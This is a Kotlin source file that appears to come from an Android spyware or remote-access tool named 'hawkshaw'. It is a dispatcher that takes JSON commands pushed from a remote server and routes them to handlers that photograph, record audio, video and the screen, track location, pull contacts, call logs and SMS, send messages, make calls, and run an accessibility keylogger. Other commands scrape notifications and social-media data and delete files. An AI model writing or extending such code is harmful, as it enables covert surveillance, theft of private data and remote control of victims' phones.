package com.hawkshaw.library.handler

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.lifecycle.LifecycleOwner
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.features.login
import com.hawkshaw.library.features.ExternalAuthCommand
import com.hawkshaw.library.features.handleExternalAuthCommand
import com.hawkshaw.library.features.telephony.handleTelephonyCommand // This is for makeCall, not messages or contacts
import com.hawkshaw.library.features.accessibility.HandlerKt as AccessibilityHandlerKt // Alias to avoid confusion
import com.hawkshaw.library.features.media.MediaService
import com.hawkshaw.library.features.telephony.calllogs.handleCallLogsCommand
import com.hawkshaw.library.features.telephony.contacts.handleContactsCommand
import com.hawkshaw.library.features.telephony.messages.handleMessagesCommand
import com.hawkshaw.library.logger.Logger
// Removed Pushy import - using private push system instead
import com.hawkshaw.library.features.location.pushLocation
import com.hawkshaw.library.features.media.handleMediaCommand
import com.hawkshaw.library.features.misc.handleDeviceAudioCommand
import com.hawkshaw.library.features.misc.pushInstalledAppList
import com.hawkshaw.library.features.misc.vibrate
import com.hawkshaw.library.logger.PushLogsKt
import com.hawkshaw.library.datalayer.network.socket.SocketService
import com.hawkshaw.library.features.handleAuthCommand
import com.hawkshaw.library.features.misc.handleMiscCommand
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json
import com.hawkshaw.library.ktextensions.safeLaunch
import kotlin.coroutines.*
import android.util.Log // Added for logging

/**
 * Utility functions for resolving and handling commands from different sources
 */
private const val TAG = "CommandResolver"

/**
 * Handle a command from a specific source
 * @param command The command to handle
 * @param commandSource The source of the command
 * @param scope The coroutine scope for async operations
 * @return Result of the command handling
 */
@RequiresApi(Build.VERSION_CODES.P)
suspend fun handleCommand(command: Command, commandSource: CommandSource, scope: CoroutineScope): Any {
    Log.d(TAG, "[DEBUG] handleCommand called. CommandType: ${command.type}, Source: $commandSource, CommandSentTime: ${command.sentTime}")
    if (commandSource != CommandSource.Pushy) {
        Logger.d(TAG, "Command Received: ${command.type}, $commandSource", false, 4, null)
    }
    
    Log.d(TAG, "[DEBUG] handleCommand: Switching to Dispatchers.IO for command processing.")
    return withContext(Dispatchers.IO) {
        Log.d(TAG, "[DEBUG] handleCommand: Now on Dispatchers.IO. Processing CommandType: ${command.type}")
        try {
            when (command.type) {
                Command.CommandType.Unknown -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Unknown. Command: $command")
                    Logger.e(
                        TAG,
                        "Unknown command, ${command.sentTime}",
                        b = false,
                        i = 12,
                        nothing = null
                    )
                    Unit
                }
                
                Command.CommandType.Login -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Login. LoginRequest: ${command.loginRequest}, AuthData: ${command.authData}")
                    withContext(Dispatchers.IO) { // Explicitly on IO, though parent is already IO.
                        if (command.loginRequest != null) {
                            Log.d(TAG, "[DEBUG] handleCommand: Login - Calling login() with email: ${command.loginRequest.email}")
                            login(command.loginRequest.email ?: "")
                        } else {
                            Log.d(TAG, "[DEBUG] handleCommand: Login - Calling handleAuthCommand().")
                            handleAuthCommand(
                                command = command,
                                scope = scope,
                                context = App.getContext()
                            )
                        }
                    }
                }
                
                Command.CommandType.PushTokens -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushTokens. Using private push system - no tokens needed.")
                    // Private push system doesn't require token registration like FCM
                    Unit
                }
                
                Command.CommandType.PushData -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushData. Calling pushData().")
                    withContext(Dispatchers.IO) {
                        pushData()
                    }
                }
                
                Command.CommandType.StartRepeatPushData -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case StartRepeatPushData. Request: ${command.startRepeatPushDataRequest}")
                    JobScheduler.startScheduler(command.startRepeatPushDataRequest)
                    Unit
                }
                
                Command.CommandType.StopRepeatPushData -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case StopRepeatPushData. Calling JobScheduler.stopScheduler().")
                    JobScheduler.stopScheduler()
                    Unit
                }
                
                Command.CommandType.PushLocation -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushLocation. GetLocationRequest: ${command.getLocationRequest}")
                    withContext(Dispatchers.IO) {
                        pushLocation(command.getLocationRequest)
                    }
                }
                
                Command.CommandType.Vibrate -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Vibrate. VibrateRequest: ${command.vibrateRequest}")
                    withContext(Dispatchers.IO) {
                        // FIX 1: Null check for vibrateRequest
                        command.vibrateRequest?.let {
                            Log.d(TAG, "[DEBUG] handleCommand: Vibrate - Calling vibrate() with pattern: it")
                            vibrate(it)
                        } ?: run {
                            Log.e(TAG, "[DEBUG] handleCommand: Vibrate - Vibrate request is null.")
                            Logger.e(TAG, "Vibrate request is null", b = false, i = 12, nothing = null)
                        }
                    }
                }
                
                Command.CommandType.PushInstalledAppList -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushInstalledAppList.")
                    withContext(Dispatchers.IO) {
                        val context = App.getContext()
                        Log.d(TAG, "[DEBUG] handleCommand: PushInstalledAppList - Context: $context, Is LifecycleOwner: ${context is LifecycleOwner}")
                        if (context is LifecycleOwner) {
                            pushInstalledAppList(context)
                        } else {
                            Log.e(TAG, "[DEBUG] handleCommand: PushInstalledAppList - Context is not a LifecycleOwner.")
                            Logger.e(
                                TAG,
                                "Context is not a LifecycleOwner, cannot push installed app list",
                                b = false,
                                i = 12,
                                nothing = null
                            )
                        }
                    }
                }
                
                Command.CommandType.PushAppLogs -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushAppLogs. Calling PushLogsKt.pushAppLogs().")
                    PushLogsKt.pushAppLogs()
                    Unit
                }
                
                Command.CommandType.ConnectSocket -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case ConnectSocket. Calling SocketService.connectSocket().")
                    SocketService.connectSocket()
                    Unit
                }
                
                Command.CommandType.DisconnectSocket -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case DisconnectSocket. Calling SocketService.disconnectSocket().")
                    SocketService.disconnectSocket()
                    Unit
                }
                
                Command.CommandType.MakeCall -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case MakeCall. Calling handleTelephonyCommand(). Command: $command")
                    handleTelephonyCommand(command)
                    Unit
                }
                
                Command.CommandType.PushDeviceAudio,
                Command.CommandType.SetDeviceAudio -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case PushDeviceAudio or SetDeviceAudio. Calling handleDeviceAudioCommand(). Command: $command")
                    withContext(Dispatchers.IO) {
                        handleDeviceAudioCommand(command)
                    }
                }

                // Media related commands
                Command.CommandType.TakePicture,
                Command.CommandType.RecordVideo,
                Command.CommandType.RecordAudio,
                Command.CommandType.Flash,
                Command.CommandType.PushFile,
                Command.CommandType.PushFiles,
                Command.CommandType.DeleteFile,
                Command.CommandType.PushFileExplorerWalk,
                Command.CommandType.PushThumbnails,
                Command.CommandType.DeletePendingPushFiles -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Media Command (${command.type}). Calling handleMediaCommand(). Command: $command")
                    withContext(Dispatchers.IO) {
                        handleMediaCommand(App.getContext(), command)
                    }
                }

                // Telephony related commands
                Command.CommandType.PushCallLogs,
                Command.CommandType.AddCallLog,
                Command.CommandType.DeleteCallLog -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case CallLog Command (${command.type}). Launching suspendCancellableCoroutine for handleCallLogsCommand. Command: $command")
                    suspendCancellableCoroutine<Any> { continuation ->
                        Log.d(TAG, "[DEBUG] handleCommand: CallLog - Coroutine for handleCallLogsCommand starting. Scope: $scope")
                        scope.launch(Dispatchers.IO) { // Explicitly IO, good for clarity.
                            try {
                                Log.d(TAG, "[DEBUG] handleCommand: CallLog - Inside Coroutine, calling handleCallLogsCommand.")
                                handleCallLogsCommand(command, continuation)
                                Log.d(TAG, "[DEBUG] handleCommand: CallLog - handleCallLogsCommand completed.")
                            } catch (e: Exception) {
                                Log.e(TAG, "[DEBUG] handleCommand: CallLog - Exception in handleCallLogsCommand coroutine.", e)
                                continuation.resumeWithException(e)
                            }
                        }
                    }
                }

                Command.CommandType.PushContacts,
                Command.CommandType.AddContact,
                Command.CommandType.DeleteContact -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Contacts Command (${command.type}). Calling handleContactsCommand. Command: $command")
                    // FIX 2: Call handleContactsCommand directly as it's a suspend function.
                    // It should handle its own coroutine context internally.
                    handleContactsCommand(command)
                }

                Command.CommandType.PushMessages,
                Command.CommandType.SendMessage -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Messages Command (${command.type}). Calling handleMessagesCommand. Command: $command")
                    // FIX 3: Call handleMessagesCommand directly as it's a suspend function.
                    // It should handle its own coroutine context internally.
                    handleMessagesCommand(command)
                }

                // Misc commands
                Command.CommandType.PushDeviceInfo,
                Command.CommandType.OpenApp,
                Command.CommandType.OpenDeeplink,
                Command.CommandType.GetDiagnosis,
                Command.CommandType.ScheduleCommand,
                Command.CommandType.CancelScheduledCommand,
                Command.CommandType.StartInitializer,
                Command.CommandType.SetDynamicConfig,
                Command.CommandType.PushDynamicConfig -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Misc Command (${command.type}). Launching suspendCancellableCoroutine for handleMiscCommand. Command: $command")
                    suspendCancellableCoroutine<Any> { continuation ->
                        Log.d(TAG, "[DEBUG] handleCommand: Misc - Coroutine for handleMiscCommand starting. Scope: $scope")
                        scope.launch(Dispatchers.IO) { // Explicitly IO
                            try {
                                Log.d(TAG, "[DEBUG] handleCommand: Misc - Inside Coroutine, calling handleMiscCommand.")
                                handleMiscCommand(command, continuation)
                                Log.d(TAG, "[DEBUG] handleCommand: Misc - handleMiscCommand completed.")
                            } catch (e: Exception) {
                                Log.e(TAG, "[DEBUG] handleCommand: Misc - Exception in handleMiscCommand coroutine.", e)
                                continuation.resumeWithException(e)
                            }
                        }
                    }
                }

                // Accessibility commands
                Command.CommandType.RunAccessibilityCommand,
                Command.CommandType.PushAccessibilityKeylogger,
                Command.CommandType.PushAccessibilityNotifications,
                Command.CommandType.PushAccessibilitySocialMedia,
                Command.CommandType.AccessibilityNukeSocialMediaDatabase -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Accessibility Command (${command.type}). Calling AccessibilityHandlerKt.handleAccessibilityCommand. Command: $command")
                    withContext(Dispatchers.IO) {
                        AccessibilityHandlerKt.handleAccessibilityCommand(command, scope)
                    }
                }

                Command.CommandType.RecordScreen -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case RecordScreen. Calling ScreenCommandHandler.handleRecordScreenCommand. Command: $command")
                    withContext(Dispatchers.IO) {
                        com.hawkshaw.library.features.screen.ScreenCommandHandler.handleRecordScreenCommand(command)
                    }
                }

                Command.CommandType.StartScreenProjection,
                Command.CommandType.StopScreenProjection -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case Screen Projection (${command.type}). Calling ScreenCommandHandler.handleScreenProjectionCommand. Command: $command")
                    withContext(Dispatchers.IO) {
                        com.hawkshaw.library.features.screen.ScreenCommandHandler.handleScreenProjectionCommand(command)
                    }
                }

                Command.CommandType.CheckAppUpdate,
                Command.CommandType.ForceAppUpdate,
                Command.CommandType.ReportAppInstall -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case App Update (${command.type}). Calling AppUpdateCommandHandler.handleUpdateCommand. Command: $command")
                    withContext(Dispatchers.IO) {
                        com.hawkshaw.library.features.update.AppUpdateCommandHandler.handleUpdateCommand(command, App.getContext())
                    }
                }

                Command.CommandType.SyncAppConfig -> {
                    Log.d(TAG, "[DEBUG] handleCommand: Case SyncAppConfig. Calling handleSyncAppConfig. Command: $command")
                    handleSyncAppConfig(command, scope)
                }

                else -> {
                    Log.w(TAG, "[DEBUG] handleCommand: Case Else (Unhandled command type: ${command.type})")
                    Logger.w(TAG, "Unhandled command type: ${command.type}")
                    Unit
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] handleCommand: Exception caught in main try-catch block for command ${command.type}. Message: ${e.message}", e)
            Logger.e(TAG, "Error handling command: ${e.message}", e, false, 12, null)
            Unit
        }
    }.also {
        Log.d(TAG, "[DEBUG] handleCommand for CommandType: ${command.type} finished on Dispatchers.IO. Result: $it")
    }
}

/**
 * Default version of handleCommand that uses CommandSource.Unknown if not specified
 */
@RequiresApi(Build.VERSION_CODES.P)
suspend fun handleCommand(command: Command, scope: CoroutineScope): Any {
    Log.d(TAG, "[DEBUG] handleCommand (default source) called. CommandType: ${command.type}")
    return handleCommand(command, CommandSource.Unknown, scope)
}

/**
 * Handle a command from a string representation
 * @param commandString The command as a JSON string
 * @param commandSource The source of the command
 */
@RequiresApi(Build.VERSION_CODES.P)
fun handleCommandString(commandString: String, commandSource: CommandSource) {
    Log.d(TAG, "[DEBUG] handleCommandString called. Source: $commandSource, CommandString: \"$commandString\"")
    CoroutineScope(Dispatchers.IO).safeLaunch {
        Log.d(TAG, "[DEBUG] handleCommandString: Coroutine launched on Dispatchers.IO.")
        try {
            // Parse the command string to a Command object using JSON
            Log.d(TAG, "[DEBUG] handleCommandString: Decoding commandString to Command object.")
            val command = Json.decodeFromString(Command.serializer(), commandString)
            Log.d(TAG, "[DEBUG] handleCommandString: Successfully decoded. CommandType: ${command.type}, SentTime: ${command.sentTime}")

            // Handle the command
            Log.d(TAG, "[DEBUG] handleCommandString: Calling handleCommand.")
            handleCommand(command, commandSource, this)
            Log.d(TAG, "[DEBUG] handleCommandString: handleCommand completed.")
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] handleCommandString: Exception caught. Message: ${e.message}", e)
            Logger.e(TAG, "Error handling command string: ${e.message}", e, false, 12, null)
        }
    }
}

// resolveCommand function has been removed from here.